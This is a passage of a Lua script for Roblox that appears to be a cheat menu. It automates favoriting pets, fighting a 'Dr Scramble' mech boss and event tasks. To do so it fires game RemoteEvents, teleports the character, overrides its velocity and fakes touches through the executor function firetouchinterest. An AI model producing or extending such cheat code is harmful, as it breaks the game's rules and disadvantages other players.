			return (tbl24[arg] or 0) > os.clock()
		end

		local function fn15(arg)
			local tbl25 = {}
			local v14, v15, v16 = pairs(arg.Inventory or {})
			local n6 = 0

			for k, v17 in v14, v15, v16 do
				if type(v17) == "table" and fn13(v17) then
					n6 += 1

					if v17.IsFavorite ~= true and not fn14(k) then
						table.insert(tbl25, k)
					end
				end
			end

			return tbl25, n6
		end

		local function fn16(arg, arg2, arg3)
			local tbl25 = {}
			local inventory = arg.Inventory or {}
			local v14 = pairs
			local equippedAssets = arg.EquippedAssets or {}

			for _, equippedAsset in v14(equippedAssets) do
				local v15 = inventory[equippedAsset]

				if type(v15) == "table" and not fn14(equippedAsset) then
					if arg2 then
						if v15.IsFavorite ~= true then
							table.insert(tbl25, equippedAsset)
						end
					else
						local flag3 = v15.IsFavorite == true

						if flag3 then
							flag3 = not (arg3 and fn13(v15))
						end

						if flag3 then
							table.insert(tbl25, equippedAsset)
						end
					end
				end
			end

			return tbl25
		end

		local function fn17(arg, arg2)
			local rePetSatchelWriteFavourite = networking:FindFirstChild("RE/PetSatchel/WriteFavourite")
			if not rePetSatchelWriteFavourite or not rePetSatchelWriteFavourite:IsA("RemoteEvent") then
				return
			end

			for i, v14 in ipairs(arg) do
				if not (n2 < i) then
					tbl24[v14] = os.clock() + n3
					pcall(rePetSatchelWriteFavourite.FireServer, rePetSatchelWriteFavourite, v14, arg2)
					task.wait(0.12)
					continue
				end

				break
			end
		end

		local function fn18(arg, arg2)
			if flag2 or #arg == 0 then
				return false
			end
			flag2 = true
			n5 = os.clock() + n

			task.spawn(function()
				pcall(fn17, arg, arg2)
				flag2 = false
				tbl3.Wake()
			end)

			return true
		end

		tbl3.Add(function()
			local v14 = fn8()
			if not v14 then
				return false
			end
			local v15 = tbl4.Toggle(v8, false)
			local v16, v17 = fn15(v14)

			if v11 and type(v11.Set) == "function" then
				local v18 = pairs
				local inventory = v14.Inventory or {}
				local n6 = 0

				for _, v19 in v18(inventory) do
					if type(v19) == "table" and v19.IsFavorite == true then
						n6 += 1
					end
				end

				pcall(v11.Set, v11, string.format("Favorite matches  -  %d pets, %d to mark  |  %d favorited", v17, #v16, n6))
			end

			if flag2 or os.clock() < n5 then
				return false
			end

			if v15 and fn18(v16, true) then
				return false
			end

			if tbl4.Toggle(v9, false) then
				if fn18(fn16(v14, true, false), true) then
					return false
				end
			elseif tbl4.Toggle(v10, false) then
				fn18(fn16(v14, false, v15), false)
			end

			return false
		end)

		v11 = v7:CreateText({ Name = "Favorite Preview", Text = "Favorite matches  -  0 pets" })

		v8 = v7:CreateToggle({
			Name = "Auto Favorite Pet",
			Note = "Favorite pets matching the rules below",
			Default = false,
			Callback = function()
				table.clear(tbl24)
				tbl3.Wake()
			end,
		})

		v7:CreateButton({
			Name = "Favorite Pets Now",
			Note = "Favorite matching pets once",
			ButtonText = "Favorite",
			ConfirmText = "Done!",
			SubOf = v8,
			Callback = function()
				local v14 = fn8()

				if v14 then
					fn18(fn15(v14), true)
				end
			end,
		})

		v7:CreateDropdown({
			Name = "Favorite Rule",
			Note = "Pass any check or all checks",
			Options = tbl10,
			Default = tbl10[2],
			SubOf = v8,
			Callback = function(arg)
				if table.find(tbl10, arg) then
					v12 = arg
					tbl3.Wake()
				end
			end,
		})

		v7:CreateDropdown({
			Name = "Favorite Min Rarity",
			Note = "Favorite pets of the chosen rarity and every rarity above it (Off = skip)",
			Options = tbl12,
			Default = "Off",
			SubOf = v8,
			Callback = function(arg)
				v13 = tbl13[arg]
				tbl3.Wake()
			end,
		})

		fn6(v7:CreateMultiDropdown({
			Name = "Favorite Mutations",
			Note = "Mutation check (empty = skip)",
			Options = tbl16,
			Default = {},
			SubOf = v8,
			Callback = function(arg)
				local tbl25 = {}
				local flag3 = false

				if type(arg) == "table" then
					for k, v14 in pairs(arg) do
						k = v14 == true and type(k) == "string" and k
						local flag4

						if k then
							flag4 = k
						else
							flag4 = type(v14) == "string" and v14
						end

						local v15 = flag4 or nil

						if v15 == str then
							flag3 = true
						elseif v15 then
							tbl25[tbl17[v15] or v15] = true
						end
					end
				end

				flag = flag3
				tbl22 = tbl25
				tbl3.Wake()
			end,
		}))

		local tbl25 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local n6 = 0
		local str2 = "M/s"

		local function fn19(arg, arg2)
			if arg ~= nil then
				n6 = math.max(0, math.floor(tonumber(arg) or n6))
			end

			if arg2 ~= nil then
				str2 = tostring(arg2)
			end

			n4 = n6 * (tbl25[str2] or tbl25["M/s"]).Mult
			tbl3.Wake()
		end

		fn5(v7, {
			Name = "Min Favorite Value",
			Note = "Value check (0 = skip)",
			SubOf = v8,
			Legacy = "Favorite Min Value",
			SectionName = "Auto Favorite",
			OnRaw = function(arg)
				fn19(math.floor(arg / 1000), "K/s")
			end,
		})

		fn6(v7:CreateMultiDropdown({
			Name = "Always Favorite Species",
			Note = "Always favorite these species",
			Options = tbl14,
			Default = {},
			SubOf = v8,
			Callback = function(arg)
				local tbl26 = {}

				if type(arg) == "table" then
					for k, v14 in pairs(arg) do
						k = v14 == true and type(k) == "string" and k or type(v14) == "string" and v14 or nil

						if k and tbl15[k] then
							tbl26[tbl15[k]] = true
						end
					end
				end

				tbl23 = tbl26
				tbl3.Wake()
			end,
		}))

		v9 = v7:CreateToggle({
			Name = "Auto Favorite Equipped",
			Note = "Keep equipped pets favorited",
			Default = false,
			Callback = function()
				tbl3.Wake()
			end,
		})

		v10 = v7:CreateToggle({
			Name = "Auto Unfavorite Equipped",
			Note = "Unfavorite equipped pets not in the rules",
			Default = false,
			Callback = function()
				tbl3.Wake()
			end,
		})

		v7:CreateButton({
			Name = "Favorite Equipped Now",
			Note = "Favorite all equipped pets once",
			ButtonText = "Favorite",
			ConfirmText = "Done!",
			Callback = function()
				local v14 = fn8()

				if v14 then
					fn18(fn16(v14, true, false), true)
				end
			end,
		})

		v7:CreateButton({
			Name = "Unfavorite Equipped Now",
			Note = "Unfavorite all equipped pets once",
			ButtonText = "Unfavorite",
			ConfirmText = "Done!",
			Callback = function()
				local v14 = fn8()

				if v14 then
					fn18(fn16(v14, false, false), false)
				end
			end,
		})
	end

	local save = tbl.Save

	if type(save) == "table" and type(save.FieldSignal) == "function" then
		for _, v8 in ipairs({ "Inventory", "EquippedAssets" }) do
			local ok, result = pcall(save.FieldSignal, v8)

			if ok and type(result) == "table" and type(result.Connect) == "function" then
				local ok2, result2 = pcall(result.Connect, result, function()
					tbl3.Wake()
				end)

				if ok2 and result2 then
					fn4(function()
						pcall(function()
							result2:Disconnect()
						end)
					end)
				end
			end
		end
	end

	tbl4.MechBoot = function(arg)
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Shared.Util.ScrambleBossHazards)
		end)

		local mech = {
			Handle = nil,
			Row = nil,
			Status = "Idle",
			Shown = nil,
			Busy = false,
			Generation = 0,
			Hazards = {},
			TravelSpeed = 250,
			Radius = 18,
			SwingGap = 0.12,
			Dodge = true,
			TryBall = true,
			Leave = true,
			BaitSpeed = 225,
			Interval = 1800,
			Run = nil,
			SwapTools = true,
			SwapIndex = 1,
			SwapSince = 0,
			MainHold = 0.3,
			SecondHold = 0.4,
			LastSwing = 0,
			Links = {},
		}

		tbl4.Mech = mech

		local function fn8()
			return tbl4.Toggle(mech.Handle, false) == true
		end

		local function fn9()
			return workspace:FindFirstChild("ScrambleArena")
		end

		local function fn10()
			return workspace:FindFirstChild("ScrambleArenaPortal")
		end

		local function fn11()
			return localPlayer:GetAttribute("InScrambleArena") == true
		end

		mech.StealFirst = function()
			local steal = tbl4.Steal
			local movement = tbl4.Movement
			if movement.PlaceWanted == true then
				return "Auto Place Egg goes first"
			end

			if movement.MutationWanted == true then
				return "Scrambled Mutation goes first"
			end

			if tbl4.Toggle(v5, false) == true and steal ~= nil and (steal.Wanted == true or steal.Carrying == true or steal.Active == true) then
				return "Auto Steal goes first"
			end
			return nil
		end

		pcall(function()
			local scheduleIntervalSeconds = require(ReplicatedStorage.Shared.Flags.ScrambleBossFlags).ScheduleIntervalSeconds
			local interval = type(scheduleIntervalSeconds) == "table" and tonumber(scheduleIntervalSeconds.Value) or nil

			if interval and interval > 0 then
				mech.Interval = interval
			end
		end)

		mech.Clock = function(arg2)
			local n = math.max(0, math.floor(arg2 + 0.5))
			return string.format("%d:%02d", math.floor(n / 60), n % 60)
		end

		mech.Timer = function()
			local serverTimeNow = workspace:GetServerTimeNow()
			local scrambleArena = workspace:FindFirstChild("ScrambleArena")
			scrambleArena = scrambleArena and tonumber(scrambleArena:GetAttribute("SpawnsAt")) or 0

			if workspace:FindFirstChild("ScrambleArenaPortal") then
				if serverTimeNow < scrambleArena then
					return "Mech portal is open  |  boss spawns in " .. mech.Clock(scrambleArena - serverTimeNow)
				end
				return "Mech portal is open now"
			end

			local interval = mech.Interval
			return "Next Mech portal in " .. mech.Clock(math.ceil(serverTimeNow / interval) * interval - serverTimeNow)
		end

		local function fn12(arg2)
			if not arg2 then
				return nil
			end
			local hitbox = arg2:FindFirstChild("Hitbox", true)
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox
			end

			for _, descendant in ipairs(arg2:GetDescendants()) do
				if descendant:IsA("TouchTransmitter") and descendant.Parent and descendant.Parent:IsA("BasePart") then
					return descendant.Parent
				end
			end

			return nil
		end

		local function fn13(arg2)
			local v8 = tbl4.Root()
			if not v8 or not arg2 or type(firetouchinterest) ~= "function" then
				return
			end

			pcall(function()
				firetouchinterest(v8, arg2, 0)
				task.wait(0.05)
				firetouchinterest(v8, arg2, 1)
			end)
		end

		local function fn14(arg2, arg3)
			if not mech.Dodge or not ok or type(result) ~= "table" or type(result.Contains) ~= "function" then
				return false
			end

			for k, hazard in pairs(mech.Hazards) do
				local n = tonumber(hazard.At) or 0
				local n2 = tonumber(hazard.Warn) or 0
				if n + (tonumber(hazard.Duration) or 0.5) + 1.5 < arg3 then
					mech.Hazards[k] = nil
					continue
				end

				if arg3 >= n - n2 - 0.1 then
					local ok2, result2 = pcall(result.Contains, hazard, arg2, arg3)
					if ok2 and result2 then
						return true
					end
				end
			end

			return false
		end

		local function fn15()
			local character = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			for _, v8 in ipairs({ character, backpack }) do
				if v8 then
					for _, child in ipairs(v8:GetChildren()) do
						if child:IsA("Tool") and tostring(child:GetAttribute("ItemType")) == "Gear" then
							if string.find(string.lower(tostring(child:GetAttribute("GearName") or "")), "scrambler", 1, true) then
								return child
							end
						end
					end
				end
			end

			return nil
		end

		local function fn16()
			local lastSwing = mech.LastSwing
			if os.clock() - lastSwing < mech.SwingGap then
				return
			end
			mech.LastSwing = os.clock()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			local flag = type(tbl4.FindBat) == "function" and tbl4.FindBat() or nil
			local swapTools = mech.SwapTools and fn15() or nil
			local v8

			if flag and swapTools and flag ~= swapTools then
				local secondHold = mech.SwapIndex == 2 and mech.SecondHold or mech.MainHold
				local swapSince = mech.SwapSince

				if secondHold <= os.clock() - swapSince then
					mech.SwapIndex = mech.SwapIndex == 2 and 1 or 2
					mech.SwapSince = os.clock()
				end

				swapTools = mech.SwapIndex == 2 and swapTools
				v8 = swapTools or flag
			else
				v8 = flag or swapTools
			end

			if not v8 or not humanoid then
				return
			end

			if v8.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(v8)
				end)
			end

			pcall(function()
				v8:Activate()
			end)
		end

		local function fn17(arg2, arg3)
			local character = localPlayer.Character
			local v8 = tbl4.Root()
			if not character or not v8 then
				return
			end

			if (v8.Position - arg2).Magnitude > 3 then
				pcall(function()
					character:PivotTo(CFrame.lookAt(arg2, Vector3.new(arg3.X, arg2.Y, arg3.Z)))
					v8.AssemblyLinearVelocity = Vector3.zero
				end)
			end
		end

		local function fn18(arg2)
			local mech2 = arg2:FindFirstChild("Mech")
			local hitbox = mech2 and mech2:FindFirstChild("Hitbox")
			if hitbox and hitbox:IsA("BasePart") then
				return hitbox.Position, mech2
			end

			for _, child in ipairs(arg2:GetChildren()) do
				if child:IsA("Model") and child.Name ~= "Ball" and child.Name ~= "LeaveTeleport" and child.Name ~= "Structure" then
					local hitbox2 = child:FindFirstChild("Hitbox")
					if hitbox2 and hitbox2:IsA("BasePart") then
						return hitbox2.Position, child
					end
				end
			end

			return nil, nil
		end

		local function fn19(arg2, arg3)
			local ball = arg2:FindFirstChild("Ball")
			if not ball then
				return false
			end
			local position = ball:GetBoundingBox().Position
			local n = (tonumber(arg2:GetAttribute("FloorY")) or position.Y) + 3
			local n2 = tonumber(arg2:GetAttribute("CoreStage")) or 0

			if arg2:GetAttribute("BallStunned") == true then
				mech.Run = nil
				local vector = Vector3.new(arg3.Position.X - position.X, 0, arg3.Position.Z - position.Z)
				local unit = vector.Magnitude > 1 and vector.Unit or Vector3.new(1, 0, 0)
				fn17(Vector3.new(position.X, n, position.Z) + unit * 10, position)
				fn16()
				mech.Status = string.format("Smashing the core  |  stage %d / 3  |  core %s", n2, tostring(arg2:GetAttribute("CoreHealth") or "?"))
				return true
			end

			local str = tostring(arg2:GetAttribute("BallTarget"))
			local attribute = arg2:GetAttribute("BallCoil")

			if not mech.Run and str == tostring(localPlayer.UserId) and type(attribute) == "string" and attribute ~= "" then
				local coils = arg2:FindFirstChild("Coils")
				coils = coils and coils:FindFirstChild(attribute)
				coils = coils and coils:GetAttribute("Home")

				if typeof(coils) == "Vector3" then
					local vector = Vector3.new(coils.X - position.X, 0, coils.Z - position.Z)

					if vector.Magnitude > 1 then
						local n3 = vector.Unit * 40
						mech.Run = { Goal = Vector3.new(coils.X, n, coils.Z) + n3, Until = os.clock() + 8, Coil = attribute }
					end
				end
			end

			if mech.Run then
				local vector = Vector3.new(mech.Run.Goal.X - arg3.Position.X, 0, mech.Run.Goal.Z - arg3.Position.Z)
				local flag = vector.Magnitude < 4
				local flag2

				if flag then
					flag2 = flag
				else
					local until_ = mech.Run.Until
					flag2 = os.clock() > until_
				end

				if flag2 then
					mech.Run = nil

					pcall(function()
						arg3.AssemblyLinearVelocity = Vector3.new(0, arg3.AssemblyLinearVelocity.Y, 0)
					end)
				else
					local n3 = vector.Unit * mech.BaitSpeed

					pcall(function()
						arg3.AssemblyLinearVelocity = Vector3.new(n3.X, arg3.AssemblyLinearVelocity.Y, n3.Z)
					end)

					mech.Status = string.format("Baiting the ball into %s  |  stage %d / 3", mech.Run.Coil, n2)
				end

				return true
			end

			local vector = Vector3.new(arg3.Position.X - position.X, 0, arg3.Position.Z - position.Z)

			if vector.Magnitude > 18 or vector.Magnitude < 6 then
				local vector2 = vector.Magnitude < 1 and Vector3.new(1, 0, 0) or vector.Unit
				fn17(Vector3.new(position.X, n, position.Z) + vector2 * 12, position)
			end

			mech.Status = string.format("Ball phase, waiting for it to lock on  |  stage %d / 3", n2)
			return true
		end

		local function fn20(arg2, arg3)
			local scrambleHuman = arg2:FindFirstChild("ScrambleHuman")
			if not scrambleHuman then
				return false
			end
			local humanoidRootPart = scrambleHuman:FindFirstChild("HumanoidRootPart") or scrambleHuman.PrimaryPart or scrambleHuman:FindFirstChildWhichIsA("BasePart")
			local position = humanoidRootPart and humanoidRootPart.Position or scrambleHuman:GetPivot().Position
			humanoidRootPart = humanoidRootPart and humanoidRootPart.AssemblyLinearVelocity or Vector3.zero
			local n = position + Vector3.new(humanoidRootPart.X, 0, humanoidRootPart.Z) * 0.15
			local vector = Vector3.new(arg3.Position.X - n.X, 0, arg3.Position.Z - n.Z)
			local vector2 = vector.Magnitude > 1 and vector.Unit * 5 or Vector3.zero
			local n2 = Vector3.new(n.X, arg3.Position.Y, n.Z) + vector2
			local character = localPlayer.Character

			pcall(function()
				character:PivotTo(CFrame.lookAt(n2, Vector3.new(position.X, n2.Y, position.Z)))
			end)

			fn16()
			mech.Status = string.format("Chasing Dr Scramble  |  hits %s / %s", tostring(arg2:GetAttribute("HumanHits") or 0), tostring(arg2:GetAttribute("HumanNeeded") or 3))
			return true
		end

		local function fn21()
			local v8 = fn9()
			local v9 = tbl4.Root()
			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")
			if not v8 or not v9 then
				return
			end
			local str = tostring(v8:GetAttribute("Phase"))
			local n = tonumber(v8:GetAttribute("Health")) or 0
			local n2 = tonumber(v8:GetAttribute("MaxHealth")) or 0

			if tostring(v8:GetAttribute("GrabVictim")) == tostring(localPlayer.UserId) and character then
				character.Jump = true
				fn16()
				mech.Status = "Grabbed, breaking free"
				return
			end

			if str == "Ball" and mech.TryBall and fn19(v8, v9) then
				return
			end

			if str == "Human" and fn20(v8, v9) then
				return
			end
			local v10, flag = fn18(v8)

			if not v10 then
				local n3 = (tonumber(v8:GetAttribute("SpawnsAt")) or 0) - workspace:GetServerTimeNow()
				mech.Status = n3 > 0 and "In the arena  |  boss spawns in " .. mech.Clock(n3) or string.format("Phase %s, waiting for the boss", str)
				return
			end

			local serverTimeNow = workspace:GetServerTimeNow()
			local n3 = (tonumber(v8:GetAttribute("FloorY")) or v10.Y) + 3
			local v11 = nil
			local v12 = nil

			for i = 0, 15 do
				local n4 = i / 16 * 3.1415926535897931 * 2
				local vector = Vector3.new
				local radius = mech.Radius
				local n5 = v10.X + math.cos(n4) * radius
				local radius2 = mech.Radius
				local v13 = vector(n5, n3, v10.Z + math.sin(n4) * radius2)
				local magnitude = (v13 - v9.Position).Magnitude

				if fn14(v13, serverTimeNow) or fn14(v13, serverTimeNow + 0.4) then
					magnitude += 10000
				end

				if not v11 or magnitude < v11 then
					v11 = magnitude
					v12 = v13
				end
			end

			if v12 then
				fn17(v12, v10)
			end

			fn16()
			flag = flag and flag:GetAttribute("Overheated") == true
			mech.Status = string.format("Fighting %s  |  boss %d / %d%s", str, math.floor(n + 0.5), math.floor(n2 + 0.5), flag and "  |  OVERHEAT" or "")
		end

		local function fn22()
			local v8 = fn9()
			local v9 = fn12(v8 and v8:FindFirstChild("LeaveTeleport"))
			if not v9 then
				return
			end
			local character = localPlayer.Character

			pcall(function()
				character:PivotTo(CFrame.new(v9.Position + Vector3.new(0, 3, 0)))
			end)

			task.wait(0.2)
			fn13(v9)
		end

		local function fn23(arg2)
			local v8 = fn10()
			local v9 = fn12(v8)
			if not v8 or not v9 then
				return false
			end
			local position = v9.Position
			local now = os.clock()
			local exitTo = nil
			local v10

			while true do
				if not (os.clock() - now < 60) then
					exitTo = 1
					break
				else
					if arg2 ~= mech.Generation or not fn8() or fn11() or mech.StealFirst() then
						exitTo = 1
						break
					else
						v10 = tbl4.Root()

						if not v10 then
							exitTo = 2
							break
						else
							local vector = Vector3.new(position.X - v10.Position.X, 0, position.Z - v10.Position.Z)

							if not (vector.Magnitude <= 14) then
								local n = vector.Unit * math.min(mech.TravelSpeed, vector.Magnitude / 0.05)
								mech.Status = string.format("Going to the Mech portal, %d studs", math.floor(vector.Magnitude + 0.5))

								pcall(function()
									v10.AssemblyLinearVelocity = Vector3.new(n.X, v10.AssemblyLinearVelocity.Y, n.Z)
								end)

								RunService.Heartbeat:Wait()
								continue
							end
						end
					end

					break
				end
			end

			if exitTo ~= 1 then
				if exitTo == 2 then
					return false
				end

				pcall(function()
					v10.AssemblyLinearVelocity = Vector3.zero
				end)

				fn13(v9)
				task.wait(0.4)

				if not fn11() then
					pcall(function()
						local rfScrambleBossEnterArena = networking:FindFirstChild("RF/ScrambleBoss/EnterArena")

						if rfScrambleBossEnterArena then
							rfScrambleBossEnterArena:InvokeServer()
						end
					end)
				end
			end

			local now2 = os.clock()

			while not fn11() and os.clock() - now2 < 5 do
				task.wait(0.1)
			end

			return fn11()
		end

		local function fn24()
			mech.Busy = true
			mech.Generation = mech.Generation + 1
			local generation = mech.Generation
			tbl4.Shield("mech", true)

			pcall(function()
				if tbl4.Treadmill and tbl4.Treadmill.Riding or type(tbl4.OnBelt) == "function" and tbl4.OnBelt() then
					tbl4.ExitBelt()
				end
			end)

			if not fn11() and not mech.StealFirst() then
				pcall(fn23, generation)
			end

			while generation == mech.Generation and fn8() and fn11() and not mech.StealFirst() do
				local str = fn9()
				str = str and tostring(str:GetAttribute("Phase")) or ""

				if str == "Defeated" or str == "Final" or str == "Ended" or str == "Won" then
					mech.Status = "Dr Scramble defeated, going back home"
					mech.DefeatedAt = mech.DefeatedAt or os.clock()
					local leave = mech.Leave

					if leave then
						local defeatedAt = mech.DefeatedAt
						leave = os.clock() - defeatedAt > 15
					end

					if leave then
						pcall(fn22)
						task.wait(2)
					else
						task.wait(0.3)
					end
				else
					pcall(fn21)
					RunService.Heartbeat:Wait()
				end
			end

			if fn11() and mech.StealFirst() then
				mech.Status = tostring(mech.StealFirst()) .. ", leaving the arena"
				pcall(fn22)
				local n = 0

				while fn11() and n < 5 do
					n += task.wait(0.2)
				end
			end

			mech.DefeatedAt = nil
			mech.Run = nil
			tbl4.Shield("mech", false)
			tbl4.ReleaseMovement("mech")
			mech.Busy = false
			tbl3.Wake()
		end

		pcall(function()
			local reScrambleBossHazard = networking:FindFirstChild("RE/ScrambleBoss/Hazard")

			if reScrambleBossHazard and reScrambleBossHazard:IsA("RemoteEvent") then
				table.insert(mech.Links, reScrambleBossHazard.OnClientEvent:Connect(function(arg2)
					if type(arg2) == "table" then
						mech.Hazards[arg2.Id or #mech.Hazards + 1] = arg2
					end
				end))
			end
		end)

		mech.Row = arg:CreateText({ Name = "Mech Status", Text = "Idle" })

		mech.Handle = arg:CreateToggle({
			Name = "Auto Mech Boss",
			Default = false,
			Callback = function()
				if not fn8() then
					mech.Generation = mech.Generation + 1
				end

				tbl3.Wake()
			end,
		})

		for _, v8 in ipairs({
			{ "Mech Tween Speed", 100, 1000, 250, 10, "studs/s", "TravelSpeed" },
			{ "Main Weapon Hold", 0, 1.5, 0.3, 0.01, "s", "MainHold" },
			{ "Scrambler Hold", 0, 1.5, 0.4, 0.01, "s", "SecondHold" },
		}) do
			arg:CreateSlider({
				Name = v8[1],
				Min = v8[2],
				Max = v8[3],
				Default = v8[4],
				Increment = v8[5],
				Unit = v8[6],
				SubOf = mech.Handle,
				Callback = function(arg2)
					mech[v8[7]] = math.clamp(tonumber(arg2) or v8[4], v8[2], v8[3])
				end,
			})
		end

		for _, v8 in ipairs({
			{ "Swap Two Weapons", "SwapTools" },
			{ "Dodge Attacks", "Dodge" },
			{ "Ball And Core Phase", "TryBall" },
			{ "Leave After Fight", "Leave" },
		}) do
			arg:CreateToggle({
				Name = v8[1],
				Default = true,
				SubOf = mech.Handle,
				Callback = function(arg2)
					mech[v8[2]] = arg2 ~= false
				end,
			})
		end

		tbl3.Add(function()
			local row = mech.Row

			if not fn8() then
				mech.Status = "Off  |  " .. mech.Timer()
			elseif not mech.Busy then
				if fn11() then
					mech.Status = "In the arena"
				else
					mech.Status = mech.Timer()
				end
			end

			if row and mech.Shown ~= mech.Status and type(row.Set) == "function" then
				mech.Shown = mech.Status
				pcall(row.Set, row, mech.Status)
			end

			if not fn8() or mech.Busy then
				return true
			end

			if fn11() or fn10() then
				local v8 = mech.StealFirst()
				if v8 then
					mech.Status = v8 .. "  |  " .. mech.Timer()
					return true
				end

				if not tbl4.ClaimMovement("mech") then
					mech.Status = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
					return true
				end
				task.spawn(fn24)
				return true
			end

			return true
		end)

		fn4(function()
			mech.Generation = mech.Generation + 1

			for _, link in ipairs(mech.Links) do
				pcall(function()
					link:Disconnect()
				end)
			end

			pcall(tbl4.Shield, "mech", false)
			pcall(tbl4.ReleaseMovement, "mech")
		end)
	end

	tbl4.MechBoot(v6)
	local n
	n = 6
	local n2
	n2 = 1.5
	local n3
	n3 = 400
	local tbl10, tbl11, tbl12, tbl13, n4, snapshot, n5, flag, n6, n7
	local str, str2, tbl14, n8, flag2, tbl15, tbl16, flag3, n9, v8
	local fn8, fn9, fn10, fn11, fn12, fn13, fn14, fn15, fn16, fn17
	local fn18, fn19, fn20, fn21, fn22, fn23, fn24, fn25, fn26, fn27
	local fn28, fn29, fn30, fn31

	do
		local vector = Vector3.new(2120, -120, -355)
		tbl10 = { "LostPart1", "LostPart2" }

		tbl11 = {
			{ Label = "Experiment #001", Id = "LimitedTimeExperimentPet" },
			{ Label = "Nibbles #013", Id = "Nibbles013" },
			{ Label = "Scrambled Mutation", Id = "MutationConsumable" },
			{ Label = "2x Cash Booster", Id = "CashBooster" },
			{ Label = "1.25x Speed", Id = "SpeedBoost" },
			{ Label = "2x Treadmill Booster", Id = "TreadmillBooster" },
		}

		local tbl17 = {}

		for _, v9 in ipairs(tbl11) do
			tbl17[#tbl17 + 1] = v9.Label
		end

		tbl12 = {}
		tbl13 = {}
		n4 = 0
		local tbl18 = { ["Experiment #001"] = true, ["Nibbles #013"] = true, ["Scrambled Mutation"] = true }
		snapshot = nil
		n5 = -math.huge
		flag = false
		n6 = 0
		n7 = 0
		str = ""
		str2 = ""
		tbl14 = { Tool = nil, EquipAt = 0 }
		n8 = 16
		flag2 = false
		tbl15 = { Index = 1, Since = 0, Tool = nil }
		tbl16 = { Latch = false, Ended = false }
		flag3 = false
		n9 = 0
		v8 = nil

		local function fn32()
			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			packages = packages and packages:FindFirstChild("RF/Scramble/Request")
			if packages and packages:IsA("RemoteFunction") then
				return packages
			end
			return nil
		end

		fn8 = function(arg, ...)
			local v9 = fn32()
			if not v9 then
				return nil
			end
			local v10 = table.pack(...)

			local ok, result = pcall(function()
				return v9:InvokeServer(arg, table.unpack(v10, 1, v10.n))
			end)

			if not ok or type(result) ~= "table" then
				return nil
			end

			if type(result.Snapshot) == "table" then
				snapshot = result.Snapshot
				n5 = os.clock()
			elseif arg == "Snapshot" and type(result.State) == "table" then
				snapshot = result
				n5 = os.clock()
			end

			return result
		end

		fn9 = function(arg)
			if arg or snapshot == nil or os.clock() - n5 >= n then
				fn8("Snapshot")
			end

			return snapshot
		end

		fn10 = function()
			local v9 = snapshot
			return type(v9) == "table" and type(v9.State) == "table" and v9.State or nil
		end

		fn11 = function()
			local v9 = snapshot
			if type(v9) ~= "table" or v9.Enabled == false or type(v9.State) ~= "table" then
				return false
			end
			local num = tonumber(v9.EventEndsAt)
			return num == nil or workspace:GetServerTimeNow() < num
		end

		fn12 = function()
			local v9 = snapshot
			local window = type(v9) == "table" and v9.Window or nil
			if type(window) ~= "table" then
				return false, nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local num = tonumber(window.StartsAt)
			local num2 = tonumber(window.EndsAt)
			if window.Active == true or num and num2 and serverTimeNow >= num and serverTimeNow < num2 then
				return true, num2 and math.max(0, num2 - serverTimeNow) or nil
			end
			local num3 = tonumber(window.NextAt)
			return false, num3 and math.max(0, num3 - serverTimeNow) or nil
		end

		fn13 = function(arg, arg2)
			local lostParts = type(arg) == "table" and arg.LostParts or nil
			if type(lostParts) ~= "table" then
				return false
			end

			if lostParts[arg2] then
				return true
			end

			for _, lostPart in pairs(lostParts) do
				if lostPart == arg2 then
					return true
				end
			end

			return false
		end

		fn14 = function(arg)
			local n10 = 0

			for _, v9 in ipairs(tbl10) do
				if fn13(arg, v9) then
					n10 += 1
				end
			end

			return n10
		end

		local function fn33(arg)
			local n10 = math.max(0, math.floor(tonumber(arg) or 0))
			if n10 >= 3600 then
				return string.format("%dh %dm", n10 // 3600, n10 % 3600 // 60)
			end
			return string.format("%dm %ds", n10 // 60, n10 % 60)
		end

		fn15 = function()
			local v9 = fn10()
			if not v9 then
				return "Dr Scramble event is not running"
			end

			if not fn11() then
				return "Dr Scramble event has ended"
			end
			local v10, v11 = fn12()
			local str3

			if v10 then
				str3 = "Outbreak live " .. fn33(v11 or 0)
			else
				str3 = v10
			end

			str3 = str3 or v11 and "Outbreak in " .. fn33(v11) or "Outbreak soon"
			local str4 = v9.Completed == true and "Vault claimed"

			if not str4 then
				str4 = string.format("Lost %d/2  Drone %d/3", fn14(v9), math.min(3, tonumber(v9.DroneParts) or 0))
			end

			if v10 then
				local n10 = 0

				for _, v12 in pairs(tbl12) do
					if (tonumber(v12.Health) or 0) > 0 then
						n10 += 1
					end
				end

				str3 ..= string.format("  %d drones", n10)
			end

			local str5 = string.format("Samples %d  -  %s  -  %s", tonumber(v9.Samples) or 0, str4, str3)

			if str2 ~= "" and tbl4.Toggle(nil, false) then
				str5 ..= "  -  " .. str2
			end

			if str ~= "" then
				str5 ..= "  -  " .. str
			end

			return str5
		end

		fn16 = function()
			return tbl4.Root()
		end

		fn17 = function(arg, arg2, arg3, arg4)
			local n10 = arg4 or 400
			local v9 = fn16()
			if not v9 then
				return false
			end
			arg3 = arg3 or 1
			if (v9.Position - arg).Magnitude <= arg3 then
				return true
			end
			tbl4.Shield("scramble", true)
			local n11 = os.clock() + 6

			while not tbl4.Swapped() and os.clock() < n11 and not arg2() do
				str = "Waiting for the character to settle"
				RunService.Heartbeat:Wait()
			end

			local v10 = fn16() or v9
			local character = localPlayer.Character
			tbl4.Driving = tbl4.Driving + 1
			local position = v10.Position
			local flag4 = nil
			local n12 = (arg - position).Magnitude / n10 + 3
			local n13 = 0

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				if flag4 ~= nil or tbl4.AntiGuard.Busy then
					return
				end
				n13 += deltaTime
				local v11 = fn16()
				if not v11 or arg2() or n13 > n12 or localPlayer.Character ~= character then
					flag4 = false
					return
				end

				if (v11.Position - position).Magnitude > 8 then
					position = v11.Position
				end

				local n14 = arg - position
				local n15 = n10 * deltaTime
				local flag5 = n14.Magnitude <= math.max(n15, arg3)
